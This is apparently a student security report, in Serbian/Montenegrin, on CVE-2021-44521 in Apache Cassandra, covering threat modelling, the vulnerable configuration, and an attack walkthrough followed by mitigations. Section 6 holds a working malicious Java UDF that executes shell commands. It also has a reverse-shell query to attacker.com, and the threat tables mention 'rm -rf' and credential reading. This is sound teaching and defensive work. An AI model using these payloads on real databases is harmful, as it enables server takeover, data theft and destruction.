# CVE-2021-44521 — Apache Cassandra User Defined Function Remote Code Execution

###### Danilo Cvijetić R225/2025

---

## 1. Uvod

Apache Cassandra podržava **User Defined Functions (UDF)** — korisničke funkcije pisane u Javi ili JavaScript-u koje se izvršavaju unutar baze podataka tokom evaluacije CQL upita. UDF-ovi su dizajnirani da se izvršavaju u izolovanom sandbox okruženju koje ograničava pristup OS resursima.

**CVE-2021-44521** otkriva da ova izolacija može biti potpuno zaobiđena jednom konfiguracijom: kada je `enable_user_defined_functions_threads` postavljeno na `false`, Cassandra UDF-ove izvršava u **glavnom JVM threadu servera, bez aktivnog Java SecurityManager-a**. Napadač sa `CREATE FUNCTION` privilegijom može tada kreirati UDF koji poziva `Runtime.getRuntime().exec()` i izvršiti proizvoljne OS komande na serveru baze podataka.

U kontekstu Ordering podsistema, Cassandra čuva sve porudžbine, istoriju stanja i podatke o kupcima. Kompromitovanje Cassandre daje napadaču potpunu kontrolu nad svim podacima platforme.

**Ranjive verzije**:

| Grana | Ranjive verzije | Patchovana verzija |
|-------|----------------|--------------------|
| 3.0.x | < 3.0.26       | 3.0.26             |
| 3.11.x | < 3.11.12     | 3.11.12            |
| 4.0.x | < 4.0.2        | 4.0.2              |
| 4.1.x | nije zahvaćena | —                  |

---

## 2. Definicija pretnje

### 2.1 STRIDE klasifikacija

| STRIDE kategorija | Primjenljivost | Obrazloženje |
|---|---|---|
| **Spoofing** | Ne | Napad ne zahtijeva lažno predstavljanje. |
| **Tampering** | Da | Napadač može čitati i mijenjati sve podatke u bazi, uključujući statuse porudžbina i payment ID-eve. |
| **Repudiation** | Da | UDF izvršavaju se unutar Cassandre; OS komande pokrenute iz UDF-a ne ostavljaju trag u aplikacionim logovima. |
| **Information Disclosure** | Da | Čitanje konfiguracionih fajlova, env varijabli, kredencijala i svih podataka iz baze. |
| **Denial of Service** | Da | `Runtime.exec("rm -rf /var/lib/cassandra")` trajno uništava sve podatke. |
| **Elevation of Privilege** | Da | Napadač eskalira sa `CREATE FUNCTION` privilegije (Cassandra nivo) na potpuni OS pristup serverskom hostu. |

### 2.2 CWE referenca

- **CWE-732** — Incorrect Permission Assignment for Critical Resource: konfiguracija onemogućava aktivaciju SecurityManager-a za kritičnu resursu (JVM sandbox).
- **CWE-269** — Improper Privilege Management: UDF-ovi se izvršavaju sa privilegijama Cassandra JVM procesa umjesto sa izolovanim privilegijama.
- **CWE-94** — Improper Control of Generation of Code: napadač može ubaciti i izvršiti proizvoljni Java kod kroz legitimni UDF mehanizam.

### 2.3 Opis pretnje

Cassandra UDF sandbox se zasniva na Java SecurityManager-u koji se aktivira **samo kada se UDF izvršava u zasebnom threadu** (`enable_user_defined_functions_threads: true`). Kada je ova opcija postavljena na `false`, Cassandra izvršava UDF direktno u svom glavnom query processing threadu.

U tom slučaju:
1. Java SecurityManager za taj thread nije aktivan.
2. UDF kod ima puni pristup Java standardnoj biblioteci, uključujući `Runtime`, `ProcessBuilder`, `File` i `java.net`.
3. Napadač može pozvati `Runtime.getRuntime().exec()` sa proizvoljnom komandom.
4. Komanda se izvršava sa OS privilegijama Cassandra procesa (tipično `cassandra` sistemski korisnik, ponekad `root` u Docker okruženjima).

---

## 3. Afektovani resursi

### 3.1 Cassandra baza podataka — INTEGRITET / POVJERLJIVOST / DOSTUPNOST

Napadač sa punim OS pristupom može:
- Pročitati sve podatke iz svih keyspace-ova direktno sa diska (`/var/lib/cassandra/data/`)
- Izmijeniti ili obrisati SSTable fajlove (trajni gubitak podataka)
- Prekinuti Cassandra proces (`kill -9`)

**CIA**: Sva tri aspekta potpuno kompromitovana.

### 3.2 Ordering podaci — INTEGRITET / POVJERLJIVOST

Sve porudžbine (`ordering.orders`), istorija statusa (`ordering.order_status_history`) i podaci o kupcima dostupni su napadaču kroz direktno čitanje baze ili kroz UDF pozive `SELECT`.

Napadač može izmijeniti status porudžbine, payment ID ili iznos direktno u bazi, zaobilazeći state machine logiku aplikacije.

**CIA**: Integritet i povjerljivost kompromitovani.

### 3.3 Server host — POVJERLJIVOST / INTEGRITET

Kroz `Runtime.exec()` napadač dobija pristup cjelokupnom fajl sistemu, env varijablama (koje mogu sadržati API ključeve i kredencijale), mrežnim resursima i ostalim procesima na hostu.

U Docker okruženju gdje Cassandra container dijeli mrežu sa Go servisom i Redis-om, napadač može dalje lateralno se kretati ka ostalim komponentama.

**CIA**: Povjerljivost i integritet host sistema kompromitovani.

### 3.4 Aplikacioni kredencijali — POVJERLJIVOST

Env varijable Go servisa (`WEBHOOK_SECRET`, `CASSANDRA_HOST`, `REDIS_ADDR`) dostupne su kroz čitanje `/proc/[pid]/environ` ili pokretanje `printenv` na hostu.

**CIA**: Povjerljivost kompromitovana.

---

## 4. Ranjiva konfiguracija

### 4.1 cassandra.yaml (ranjivo)

```yaml
# /etc/cassandra/cassandra.yaml

# Dozvoljava kreiranje UDF-ova
enable_user_defined_functions: true

# Dozvoljava izvršavanje Nashorn/Rhino JavaScript UDF-ova
enable_scripting: true

# KRITIČNO: false = UDF-ovi se izvrsavaju bez SecurityManager-a
# Ovo je podrazumijevana vrijednost u ranjivim verzijama
enable_user_defined_functions_threads: false
```

Razlika između `true` i `false` za `enable_user_defined_functions_threads`:

| Vrijednost | UDF izvršavanje | SecurityManager | Sandbox aktivan |
|---|---|---|---|
| `true` (sigurno) | Zasebni thread pool | Aktivan | Da |
| `false` (ranjivo) | Glavni server thread | NIJE aktivan | Ne |

---

## 5. Model napada

### 5.1 Akter napada

**Maliciozni privilegovani korisnik** — napadač koji posjeduje validan Cassandra nalog sa `CREATE FUNCTION` privilegijom na ciljnom keyspace-u. U praksi može biti:
- Kompromitovani DBA (database administrator)
- Insider threat (zaposleni sa pristupom bazi)
- Napadač koji je prethodno eksploatisao drugu ranjivost i stekao Cassandra kredencijale (npr. iz konfiguracionog fajla aplikacije)

Napadač **ne mora** imati OS pristup serveru jer se sve izvršava isključivo kroz CQL konekciju na port 9042.

### 5.2 Preduslovi

- Apache Cassandra 3.0.x < 3.0.26, 3.11.x < 3.11.12, ili 4.0.x < 4.0.2
- `enable_user_defined_functions: true` u `cassandra.yaml`
- `enable_user_defined_functions_threads: false` u `cassandra.yaml` (podrazumijevana vrijednost u ranjivim verzijama)
- Napadač ima mrežni pristup Cassandra CQL portu (9042)
- Napadač posjeduje Cassandra korisnika sa `CREATE FUNCTION` ili `ALL` privilegijama na keyspace-u (ili je `SUPERUSER`)

### 5.3 Tok napada

```
1. Napadač se konektuje na Cassandra CQL port (9042)
   cqlsh <cassandra-host> 9042 -u attacker -p password

2. Kreira maliciozni UDF koji poziva Runtime.exec()
   CREATE OR REPLACE FUNCTION ordering.rce(cmd text)
   CALLED ON NULL INPUT RETURNS text LANGUAGE java
   AS $$ Runtime.getRuntime().exec(cmd); return "ok"; $$;

3. Izvrsava OS komandu kroz SELECT upit
   SELECT ordering.rce('id') FROM system.local;

4. Za ekstrakciju izlaza komande, koristi se napredna verzija UDF-a
   koji cita stdout Process-a (prikazano u sekciji 6)

5. Napadac moze: procitati konfiguracije, instalirati reverse shell,
   eksfiltrirati podatke, ili uništiti bazu
```

---

## 6. Ranjivi kod i primjer napada

### 6.1 Maliciozni UDF — detekcija okruženja

```sql
-- Korak 1: Identifikacija OS korisnika pod kojim radi Cassandra
CREATE OR REPLACE FUNCTION ordering.rce_read(cmd text)
CALLED ON NULL INPUT
RETURNS text
LANGUAGE java
AS $$
  try {
    String[] command = {"/bin/bash", "-c", cmd};
    Process process = Runtime.getRuntime().exec(command);
    byte[] output = process.getInputStream().readAllBytes();
    byte[] stderr  = process.getErrorStream().readAllBytes();
    if (output.length > 0) return new String(output, "UTF-8").trim();
    if (stderr.length  > 0) return "STDERR: " + new String(stderr, "UTF-8").trim();
    return "(no output)";
  } catch (Exception e) {
    return "EXCEPTION: " + e.getClass().getName() + ": " + e.getMessage();
  }
$$;
```

### 6.2 Izvršavanje komandi

```sql
-- Listanje Cassandra podataka na disku
SELECT ordering.rce_read('ls -la /var/lib/cassandra/data/ordering/') FROM system.local;

-- Reverse shell (napadac dobija interaktivni pristup serveru)
SELECT ordering.rce_read(
  'bash -i >& /dev/tcp/attacker.com/4444 0>&1'
) FROM system.local;
```

---

## 7. Mitigacija

### 7.1 Primarna mitigacija — Upgrade Cassandre

Nadogradnja na patchovanu verziju koja onemogućava `enable_user_defined_functions_threads: false` kada su UDF-ovi omogućeni:

| Trenutna verzija | Ciljna verzija |
|---|---|
| 3.0.x | 3.0.26 ili novija |
| 3.11.x | 3.11.12 ili novija |
| 4.0.x | 4.0.2 ili novija |
| 4.1.x | Nije zahvaćena |

U patchovanim verzijama, pokušaj postavljanja `enable_user_defined_functions_threads: false` uz `enable_user_defined_functions: true` uzrokuje grešku pri pokretanju Cassandre.

### 7.2 Onemogućavanje UDF-ova (ako nisu potrebni)

Ako Ordering servis ne koristi UDF funkcionalnost, UDF-ovi se trebaju potpuno onemogućiti:

```yaml
# cassandra.yaml — sigurna konfiguracija
enable_user_defined_functions: false
enable_scripting: false
enable_user_defined_functions_threads: true  # preporucena vrijednost cak i ako su UDF-ovi off
```

### 7.3 Princip najmanjih privilegija na CQL korisnike

Aplikacioni Cassandra korisnik ne treba imati `CREATE FUNCTION` privilegiju. Minimalni skup privilegija za Ordering servis:

### 7.4 Mrežna segmentacija

Cassandra CQL port (9042) ne smije biti dostupan sa interneta niti iz nepouzdanih zona mreže. U Docker okruženju:

```yaml
# docker-compose.yml — sigurna konfiguracija
cassandra:
  image: cassandra:4.1
  # ports:
  #   - "9042:9042"   # UKLONITI u produkciji
  networks:
    - ordering-net    # Dostupan samo unutar internog docker networka
```

Jedino Go aplikacioni servis treba imati pristup Cassandri unutar iste Docker mreže.

### 7.5 Sažetak mitigacionih mjera

| Mjera | Efikasnost | 
|---|---|
| Upgrade na 4.0.2+ | Potpuna eliminacija CVE 
| `enable_user_defined_functions: false` | Potpuna eliminacija vektora 
| Least privilege CQL korisnik | Ograničava eksploataciju 
| Mrežna segmentacija | Sprečava neovlaštenu konekciju 

---

## 8. Zaključak

CVE-2021-44521 demonstrira kako jedna konfiguraciona opcija (`enable_user_defined_functions_threads: false`) može potpuno ukloniti sandbox izolaciju i preobraziti legitimni UDF mehanizam u vektor za RCE. Napadač ne mora posjedovati OS pristup serveru.
